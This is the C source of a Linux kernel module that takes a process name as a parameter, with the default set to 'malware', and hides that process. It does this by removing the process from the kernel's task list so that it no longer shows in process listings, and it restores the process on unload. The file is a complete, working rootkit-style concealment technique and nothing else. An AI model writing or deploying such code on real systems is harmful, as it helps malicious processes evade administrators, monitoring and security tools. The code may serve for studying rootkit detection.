#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h> // for_each_process
#include <linux/string.h>

static char *target_process = "malware";
module_param(target_process, charp, 0);

/* saved state to restore the task on module unload */
static struct task_struct *hidden_task = NULL;
static struct list_head *saved_prev = NULL;

static int __init hide_process_init(void) {
  struct task_struct *task;

  printk(KERN_INFO "Hide Process Module Loaded\n");

  // 遍历所有进程
  for_each_process(task) {
    if (!task->comm)
      continue;

    if (strcmp(task->comm, target_process) == 0) {
      pr_info("Found target process '%s' [pid=%d], hiding it\n", task->comm,
              task->pid);

      saved_prev = task->tasks.prev;
      list_del_init(&task->tasks);

      hidden_task = task;
      break;
    }
  }

  return 0;
}

static void __exit hide_process_exit(void) {
  printk(KERN_INFO "Hide Process Module Unloaded\n");
  if (hidden_task && saved_prev) {
    pr_info("Restoring hidden process '%s' [pid=%d]\n", hidden_task->comm,
            hidden_task->pid);
    /* insert back after saved_prev to restore original position */
    list_add(&hidden_task->tasks, saved_prev);
    hidden_task = NULL;
    saved_prev = NULL;
  }
}

module_init(hide_process_init);
module_exit(hide_process_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple kernel module to hide a process");